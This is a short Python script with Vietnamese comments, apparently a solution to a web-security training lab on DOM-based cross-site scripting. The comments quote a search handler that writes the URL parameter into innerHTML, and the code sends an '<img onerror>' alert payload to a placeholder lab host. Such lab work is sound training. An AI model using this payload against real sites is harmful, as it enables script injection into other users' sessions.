# Khác với lab3,4 bài lab này sảy ra lỗi trong khi xử dụng thuôc tính innerHTML
# Vì dùng `.innerHTML`, trình duyệt sẽ cố gắng dịch và phân tích (parse) bất kỳ chuỗi nào được truyền vào thành mã HTML.
# Dưới đây là đoạn mã gây ra lỗi
# ```
# <script>
#     function doSearchQuery(query) {
#         document.getElementById('searchMessage').innerHTML = query;
#     }
#     var query = (new URLSearchParams(window.location.search)).get('search');
#     if(query) {
#         doSearchQuery(query);
#     }
# </script>
# ```

import requests

burp0_url = "https://YOUR_HOST.web-security-academy.net:443/?search="
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers",
    "Connection": "keep-alive"
}
payload="<img src=x onerror=alert('XSS')>"
requests.get(burp0_url + payload, headers=burp0_headers)
